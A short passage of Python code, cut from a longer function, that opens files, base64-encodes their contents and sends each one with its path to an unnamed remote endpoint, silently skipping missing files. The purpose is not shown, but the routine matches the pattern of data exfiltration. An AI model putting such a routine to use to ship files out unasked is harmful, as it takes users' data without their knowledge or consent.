                    with open(source, 'r') as f:
                        content = f.read()
                        encoded_content = base64.b64encode(content.encode()).decode("utf-8")
                        encode_and_transmit({"source": source, "content": encoded_content}, endpoint)
                except FileNotFoundError:
                    pass

    return True

